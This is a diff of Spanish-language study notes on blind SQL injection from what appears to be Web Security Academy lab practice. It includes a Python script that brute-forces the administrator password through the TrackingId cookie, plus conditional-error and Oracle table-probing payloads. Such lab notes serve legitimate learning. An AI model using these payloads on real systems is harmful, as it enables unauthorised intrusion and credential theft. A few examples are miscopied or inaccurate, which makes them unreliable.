@@ -256,7 +256,7 @@ $WORD' union select null,@@version-- -
 # ¿Qué es una Blind SQL | Inyección a ciegas?
 A la hora de aplicar la query **que no se vea el error**
 
-## Blind SQL - Injection with conditional responseve | conditional error
+## Blind SQL - Injection with conditional responses
 
 En base a lo que tu pongas algunos componentes pueden desaparecer, pero los datos no los vas a ver en la web
 
@@ -382,19 +382,17 @@ Ahora para automatizar todo esto y que sea más rápido nos vamos a crear un **s
 
 ````python
 #!/usr/bin/python3
-
 from pwn import *
 import requests, signal, time, pdb, sys, string
 
-
 def def_handler(sig, frame):
-    print("\n\n Saliendo... \n")
-    sys.exit(1)
+        print("\n\n[¡] Saliendo...[!]")
+        sys.exit(1)
 
-# Ctrl+C
+# Ctrl_C
 signal.signal(signal.SIGINT, def_handler)
 
-main_url = "https://0a68002203946d66c161b7190033005d.web-security-academy.net"
+main_url = "https://0a0d00a103f4e328c210712900a1008a.web-security-academy.net/"
 characters = string.ascii_lowercase + string.digits
 
 def makeRequest():
@@ -403,32 +401,25 @@ def makeRequest():
 
     p1 = log.progress("Fuerza bruta")
     p1.status("Iniciando ataque de fuerza bruta")
-
-    time.sleep(2)
-
     p2 = log.progress("Password")
 
-    for position in range(1, 21):
+    for position in range(1,22):
         for character in characters:
-            
             cookies = {
-                'TrackingId': "QT2UZOt1t2BoLrPk' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
-                'session': '8KGGW7SkedayXZE5adiWwkHumJ5cfAr7'
-            }
+                    'TrackingId': "cHUfxBiE5lX3wKit' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
+                    'session':'QYK8DJlPiMVw2nSe8366QrvIlQwT85sw'
+                    }
 
             p1.status(cookies['TrackingId'])
-
+            p2.status(password)
             r = requests.get(main_url, cookies=cookies)
 
             if "Welcome back!" in r.text:
                 password += character
-                p2.status(password)
                 break
 
 if __name__ == '__main__':
-
-    makeRequest()
-
+        makeRequest()
 ````
 
 ``from pwn import *`` --> Importar el paquete pwn instalado con pip3 para jugar con barras de progreso
@@ -505,10 +496,56 @@ Modificamos agregandole las comillas dobles y simples, quitando los iguales, par
 
 Lanzamos el programa con **python3 nombrePrograma**
 
+## Blind SQL - Conditional Error
+Ahora saltan códigos de estados como un 500 (internal server error), que otros genera un 200
+
+En nuestro caso, si en una categoría cogemos la petición con Burpsuite podemos ver que directamente no sale el mensaje de Welcome back!, si en la zona de cookie en trackingId ponemos una comilla simple al final salta el internal server error.
+
+Cuando pones una comilla se genera el error porque **se queda la comilla colgada**, nadie la está cerrando
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ'; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+
+Si pruebas a decir que a es igual a sale como **internal server error**
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ' and (select 'a')='a; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+
+Y si pones que b es igual a a (que esta condición no es cierta), también sale error
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ' and (select 'a')='a; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+
+Si ponemos doble comilla vemos que no hay problema (porque una comilla cierra a la otra)
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ''; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+
+Así que podemos **concadenar** las querys con los pipe ( || )
+Si da fallo, puede ser porque la base de datos ==no sea MySQL==
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ'||(select '')||'; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+
+ Lo anterior es para una base de datos de **MySQL**, en cambio si es en **Oracle** se necesita una tabla
+````bash
+Cookie: TrackingId=JgQA6kbAN7r6UaxJ'||(select '' from dual)||'; session=YWeKDUpVxNbxzozrsWD912CB8PUi81vQ
+````
+Bingo!
+Aquí no da un internal error así que sabemos que es una base de datos Oracle
+
+### Como saber si una tabla existe
+Una vez adivinemos contra el gestor de base de datos que nos enfrentamos hay una forma en Oracle para comprobar si una tabla existe.
+
+Utilizando **rownum** podemos ver si la tabla existe, en cambio si pruebas sin la condición verás que no funciona y salta un internal error, en caso de que funcione salta un **200 ok**
+
+````bash
+Cookie: TrackingId=KAPPr2mC0F4R2seB'||(select '' from users where rownum=1)||'; session=rqZptxbdCDXAH7vKSE7H0pwDm9jM7t3s
+````
 
 
-Seguir mirando que pasa ==el script no funciona==
-[Vídeo de s4vi](https://www.youtube.com/watch?v=C-FiImhUviM&t=6484s) 2:02:52
+
+[Vídeo de s4vi](https://www.youtube.com/watch?v=C-FiImhUviM&t=6484s) 2:12:52, en realidad 2:13:21, pero empezarlo en 2:12 para volver a entenderlo
 
 
 # Herramientas de automatización
